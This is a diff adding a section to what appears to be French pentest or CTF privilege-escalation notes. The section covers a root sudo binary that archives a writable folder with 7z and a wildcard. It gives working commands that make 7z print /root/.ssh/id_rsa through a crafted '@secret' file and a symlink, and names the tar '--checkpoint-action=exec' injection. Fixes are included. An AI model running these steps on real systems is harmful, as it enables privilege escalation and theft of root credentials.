@@ -71,6 +71,17 @@ done
 ```
 > Même famille : **injection par wildcard** (`tar`/`rsync`/`chown *` dans un cron). **Correctif** : **quoter** (`"[[ "$a" == "$b" ]]"`), comparer des hashs, pas de wildcard non contrôlé.
 
+### Binaire sudo « maison » qui lance 7z/tar avec un wildcard (Usage)
+Un binaire root qui fait `7za a backup.zip /dossier/*` (wildcard sur un **dossier inscriptible**) = **lecture de fichiers root**.
+```bash
+strings /usr/bin/le_binaire | grep -iE '7z|tar|/var'   # repérer l'appel + le wildcard
+cd /dossier_inscriptible          # celui que le binaire archive
+touch @secret                     # 7z voit l'arg @secret -> "lis la liste de fichiers 'secret'"
+ln -s /root/.ssh/id_rsa secret    # secret -> fichier root, lu PAR root
+sudo /usr/bin/le_binaire          # 7z échoue sur chaque ligne -> la recrache en WARNING
+```
+> **Pourquoi** : `*` injecte des arguments (mes fichiers) ; un argument `@fichier` fait **lire** ce fichier par 7z ; l'erreur **affiche son contenu**. Équivalent `tar` : fichiers `--checkpoint=1`, `--checkpoint-action=exec=sh shell.sh`. **Correctif** : chemins explicites, `--` avant les chemins, ne pas archiver un dossier inscriptible en root.
+
 ### SUID / SGID
 Binaires s'exécutant avec les droits du **propriétaire** (souvent root).
 ```bash
